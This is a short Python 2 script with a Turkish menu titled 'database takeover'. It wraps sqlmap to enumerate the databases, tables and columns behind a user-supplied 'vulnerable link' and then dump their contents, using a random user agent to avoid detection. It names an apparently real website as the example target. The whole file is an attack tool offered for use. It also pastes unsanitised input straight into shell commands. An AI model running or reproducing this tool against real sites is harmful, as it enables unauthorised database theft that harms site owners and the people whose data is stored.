#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet VERI TABANI ELE GECIRME")
print("""
Veri Tabanı Ele Geçirme Programına Hoş Geldiniz.

1) Sadece Açıklı Linki Biliyorum.
2) Açıklı Linki, VeriTabanı Adını Biliyorum.
3) Açıklı Linki, VeriTabanı Adını, Tablo Adını Biliyorunm.
4) Açıklı Linki, VeriTabanı Adını, Tablo Adını, Colon Adını Biliyorum.

Örnek Açıklı Link : http://www.suesupriano.com/article.php?id=25

""")

islemno = raw_input("İşlem No Girin: ")
if(islemno == "1"):
	aciklilink = raw_input("Açıklı Linki Girin: ")
	os.system("sqlmap -u " + aciklilink + " --dbs --random-agent")

if(islemno == "2"):
	aciklilink = raw_input("Açıklı Linki Girin: ")
	veritabani = raw_input("VeriTabanı Adını Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")
if(islemno == "3"):
	aciklilink = raw_input("Açıklı Linki Girin: ")
	veritabani = raw_input("VeriTabanı Adını Girin: ")
	tablo = raw_input("Tablo Adını Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --columns --random-agent")

if(islemno == "4"):
	aciklilink = raw_input("Açıklı Linki Girin: ")
	veritabani = raw_input("VeriTabanı Adını Girin: ")
	tablo = raw_input("Tablo Adını Girin: ")
	colon = raw_input("Kolon Adını Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + colon + " --dump --random-agent")	
